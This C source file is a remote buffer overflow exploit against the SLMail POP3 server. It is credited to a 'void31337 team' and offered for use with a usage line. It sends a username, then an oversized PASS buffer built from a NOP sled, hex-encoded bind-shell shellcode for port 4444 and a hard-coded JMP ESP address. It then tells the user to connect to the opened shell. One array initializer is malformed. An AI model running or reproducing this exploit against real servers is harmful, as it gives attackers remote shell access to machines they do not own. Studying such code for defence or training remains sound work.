/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
unsigned char shellcode[] =
"\xd9\xea\xd9\x74\x24\xf4\xbd\x84\x91\x4e\x1d\x58\x33\xc9\xb1"
"\x52\x31\x68\x17\x03\x68\x17\x83\x6c\x6d\xac\xe8\x90\x66\xb3"
"\x13\x68\x77\xd4\x9a\x8d\x46\xd4\xf9\xc6\xf9\xe4\x8a\x8a\xf5"
"\x8f\xdf\x3e\x8d\xe2\xf7\x31\x26\x48\x2e\x7c\xb7\xe1\x12\x1f"
"\x3b\xf8\x46\xff\x02\x33\x9b\xfe\x43\x2e\x56\x52\x1b\x24\xc5"
"\x42\x28\x70\xd6\xe9\x62\x94\x5e\x0e\x32\x97\x4f\x81\x48\xce"
"\x4f\x20\x9c\x7a\xc6\x3a\xc1\x47\x90\xb1\x31\x33\x23\x13\x08"
"\xbc\x88\x5a\xa4\x4f\xd0\x9b\x03\xb0\xa7\xd5\x77\x4d\xb0\x22"
"\x05\x89\x35\xb0\xad\x5a\xed\x1c\x4f\x8e\x68\xd7\x43\x7b\xfe"
"\xbf\x47\x7a\xd3\xb4\x7c\xf7\xd2\x1a\xf5\x43\xf1\xbe\x5d\x17"
"\x98\xe7\x3b\xf6\xa5\xf7\xe3\xa7\x03\x7c\x09\xb3\x39\xdf\x46"
"\x70\x70\xdf\x96\x1e\x03\xac\xa4\x81\xbf\x3a\x85\x4a\x66\xbd"
"\xea\x60\xde\x51\x15\x8b\x1f\x78\xd2\xdf\x4f\x12\xf3\x5f\x04"
"\xe2\xfc\xb5\x8b\xb2\x52\x66\x6c\x62\x13\xd6\x04\x68\x9c\x09"
"\x34\x93\x76\x22\xdf\x6e\x11\x47\x2b\x70\xae\x3f\x29\x70\x21"
"\x9c\xa4\x96\x2b\x0c\xe1\x01\xc4\xb5\xa8\xd9\x75\x39\x67\xa4"
"\xb6\xb1\x84\x59\x78\x32\xe0\x49\xed\xb2\xbf\x33\xb8\xcd\x15"
"\x5b\x26\x5f\xf2\x9b\x21\x7c\xad\xcc\x66\xb2\xa4\x98\x9a\xed"
"\x1e\xbe\x66\x6b\x58\x7a\xbd\x48\x67\x83\x30\xf4\x43\x93\x8c"
"\xf5\xcf\xc7\x40\xa0\x99\xb1\x26\x1a\x68\x6b\xf1\xf1\x22\xfb"
"\x84\x39\xf5\x7d\x89\x17\x83\x61\x38\xce\xd2\x9e\xf5\x86\xd2"
"\xe7\xeb\x36\x1c\x32\xa8\x47\x57\x1e\x99\xcf\x3e\xcb\x9b\x8d"
"\xc0\x26\xdf\xab\x42\xc2\xa0\x4f\x5a\xa7\xa5\x14\xdc\x54\xd4"
"\x05\x89\x5a\x4b\x25\x98";

void exploit(int sock) {
      FILE *test;
      char *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[2606];
      char buf[2960];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90";
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 2960);
      memset(evil, 0x00, 2606);
      memset(evil, 0x43, 2606);
      ptr = evil;
      ptr = ptr + 363; // 2608
      memcpy(ptr, &nopsled, 8);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 351);

      *(long*)&evil[2600] = 0x8f354a5f; // JMP ESP XP 5f4a358f FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
